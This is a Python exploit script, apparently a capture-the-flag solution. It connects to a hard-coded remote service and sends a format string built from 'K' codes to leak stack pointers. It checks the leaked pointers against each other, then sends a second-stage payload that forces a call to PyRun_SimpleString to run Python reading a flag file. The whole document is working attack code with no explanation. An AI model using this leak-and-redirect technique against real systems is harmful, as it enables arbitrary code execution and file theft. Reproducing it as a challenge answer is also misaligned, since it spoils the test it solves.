#!/usr/bin/env python3

import ast
import socket
import struct
import sys


HOST = "35.194.108.145"
PORT = 13840
PYRUN_SIMPLESTRING = 0x4B5892
LEAK_FMT = b"(" + b"K" * 40 + b")\n"
EXEC_FMT = b"KKKKKKKO&      " + b"\x00"
FLAG_CMD = b"import glob;print(open(glob.glob('/app/flag-*')[0]).read())"


def recv_line(sock: socket.socket) -> bytes:
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return bytes(data)


def build_stage2(request_addr: int) -> bytes:
    command_addr = request_addr + 0x20
    payload = bytearray(EXEC_FMT)
    payload += struct.pack("<Q", PYRUN_SIMPLESTRING)
    payload += struct.pack("<Q", command_addr)
    payload += FLAG_CMD
    payload += b"\x00\n"
    return bytes(payload)


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    with socket.create_connection((host, port)) as sock:
        banner = recv_line(sock)
        if banner:
            sys.stdout.buffer.write(banner)

        sock.sendall(LEAK_FMT)
        leak_line = recv_line(sock).strip()
        values = ast.literal_eval(leak_line.decode())

        request_from_slot18 = values[17] - 0xC8
        request_from_slot26 = values[25] - 0xE0
        request_from_slot34 = values[33] - 0x130
        candidates = {request_from_slot18, request_from_slot26, request_from_slot34}
        if len(candidates) != 1:
            raise RuntimeError(f"request pointer mismatch: {sorted(hex(x) for x in candidates)}")

        sock.sendall(build_stage2(request_from_slot26))

        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)

    sys.stdout.buffer.write(b"".join(chunks))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
